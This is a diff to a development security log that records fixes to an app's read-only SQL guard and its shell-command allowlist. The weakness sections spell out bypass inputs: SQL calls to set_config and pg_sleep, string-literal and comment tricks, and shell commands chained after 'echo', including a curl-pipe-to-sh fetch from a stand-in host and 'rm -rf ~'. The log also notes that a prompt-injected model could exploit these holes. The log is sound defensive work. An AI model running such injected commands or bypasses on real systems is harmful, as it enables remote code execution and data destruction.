@@ -270,6 +270,79 @@ listed one after another), exhaust memory, or bounce requests to internal hosts.
 - (pending push) Harden pc_run_shell with human UI approvals; ignore client confirm.
 
 
+## Security fix: pglite_query side-effect function bypass (2026-11-01 Africa/Lagos)
+
+**Status:** done — fixed, regression-tested, pushed. Commit c2266bb.
+
+### Weakness (confirmed live on an in-memory PGLite)
+`assertReadOnlySql` only blocked write keywords, so any SELECT that *calls* a state-changing function passed:
+- `SELECT set_config('search_path','evil',false)` persisted on the shared single connection, poisoning every later app query.
+- `U&"\0073et_config"(...)` (unicode-escaped name) and `"set_config"(...)` (quoted name) hid the function from word checks.
+- `SELECT pg_sleep(2)` ran the full 2s despite a 500ms timeout: PGLite runs synchronously in the Node event loop and ignores statement_timeout, so a long call freezes the whole server.
+- `pg_advisory_lock`, `lo_create`, `query_to_xml('<sql>')`, `FOR SHARE` row locks, and `SELECT ... INTO` also got through.
+- Plain EXPLAIN never worked (it was wrapped in a subquery).
+
+### Fix
+- Denylist of side-effect / file / backend / nested-SQL / blocking functions (checked with quotes stripped), refuse U& escapes, nested or unterminated block comments, locking reads, INTO/PREPARE/LOCK, EXPLAIN ANALYZE, SQL over 20,000 chars and NUL bytes.
+- Plain EXPLAIN runs unwrapped; rows capped client-side; timeout timer is cleared.
+
+### Checks
+- New `src/lib/mind/mcp/pglite-guard.test.ts` (24 tests on real PGLite): 23 fail against the old guard, all pass now; confirms search_path, sequence, advisory locks, and tables are untouched after every attack.
+- typecheck pass; mind/src tests 320/320; build pass; `npm run mcp:e2e` pass (pglite_query ok).
+
+### Open
+- CPU-heavy pure reads (e.g. huge `generate_series` or cross joins) can still block PGLite's event loop; a real fix needs running PGLite in a worker so a timeout can terminate it.
+- DNS rebinding for http MCP servers (from the previous cycle) still open.
+
+## Security fix: pc_run_shell allowlist bypass via shell metacharacters (2026-11-01 Africa/Lagos)
+
+**Status:** done — fixed, regression-tested, pushed. Commit 230a05d.
+
+### Weakness (confirmed locally)
+The allowlist entry `/^echo /` only checked the start of the command, so anything
+beginning with `echo ` counted as allowlisted and ran on the paired PC **without
+human approval** (it skipped the H9 approval flow and was sent with `confirm: true`):
+`echo hi; curl http://evil.invalid/x | sh`, `echo a && rm -rf ~`, `echo $(id)`,
+`` echo `id` ``, `echo a > ~/.bashrc`, `echo x<newline>rm -rf /`, `echo %USERPROFILE%`.
+Repro: `isShellAllowlisted("echo hi; curl … | sh") === true`. `pcRunShell` passed that
+command straight to the paired runner (no approval created) and also POSTed it to the
+legacy `MIND_PC_AGENT_URL /run`. A prompt-injected model could use this to run any
+command on Zack's PC.
+
+### Fix (`src/lib/mind/mcp/tools.ts`, `isShellAllowlisted`)
+- An allowlisted command must use only plain characters `[A-Za-z0-9 _.,:=+/-]`, be at most 200 chars, and match an allowlist pattern from start to end. `echo` arguments are limited to the same plain set.
+- Anything with chaining, substitution, redirection, globbing, quotes or escapes, `%`/`^`, `!`, `#`, or control characters is no longer allowlisted. It goes to the existing human approval flow.
+- `pwd`, `date`, `whoami`, `uname [-x]`, and plain `echo words` still run as before.
+
+### Checks
+- `tools.test.ts`: 5 new regression tests (32 smuggled commands refused, plain commands still allowed, smuggled echo goes to approval and the runner is never called, the legacy agent URL is never fetched, plain echo still runs). 3 of them failed before the fix. All pass now.
+- typecheck: pass. mind/src tests: 325/325. scripts tests: 198/202 (the same 4 SKILL.md/AGENTS.md doc-check failures as before; not related). build: pass. `npm run mcp:e2e`: pass.
+- Note: on the first full run, 2 timing tests failed (registry-http hang→timeout, stdio list/call) because box load average was around 220. Both passed when re-run alone, and the full suite then passed 325/325.
+
+### Open
+- `/api/mind/mcp/servers` (toggle/register/remove) and `/api/mind/mcp/call` POSTs have no Origin/same-site check. The SameSite=Lax cookie blocks cross-site requests, but same-site sibling origins (for example other preview subdomains) could still send them. `assertSameSiteRequest` exists in `src/lib/auth/isolation.server.ts`. Next cycle candidate.
+- DNS rebinding for http MCP servers is still open.
+- CPU-heavy pure reads can still block PGLite's event loop (needs a worker).
+
+## Gap: H12 pglite comment-strip / string-literal bypass (2026-11-01, Africa/Lagos)
+
+**Status:** complete (2026-11-01T15:09:29+01:00)  
+**Lock:** `mcp-integration-gap-pglite-comment-strip-bypass.lock`
+
+### Bug
+`assertReadOnlySql` stripped `--` / `/* */` with regexes that ignored string literals, so
+`SELECT '--' AS a, set_config(...)` and `SELECT '/*' AS a, pg_sleep(60), '*/' AS b` passed the guard.
+
+### Fix
+- Quote-aware tokenizer (`tokenizeSqlForGuard`): single quotes (`''`), `E''` backslash escapes, dollar quotes `$$` / `$tag$`, double-quoted idents, `--` and nested `/* */` only outside literals.
+- Keyword / side-effect function checks run on **identifier tokens**, not raw comment-stripped text.
+- Defense in depth in `pgliteQuery`: `RESET ALL` before query, `BEGIN READ ONLY` … `ROLLBACK`, then `RESET ALL` again (verified on real PGLite).
+
+### Verification
+- `tsc --noEmit`: pass
+- mind/src tests: **336/336** (incl. H12 cases in `pglite-guard.test.ts` on real PGLite)
+- `npm run build`: pass
+
 
 ## 2026-11-01T14:45:02+01:00 (Africa/Lagos) — Error Banners Bot — connector status stuck fixed
 - Gap: ServiceBoard cards stuck on "Checking connection…" (GitHub/Gmail/Drive/Calendar/Slack); Notion "status could not be read" on preview/integration.
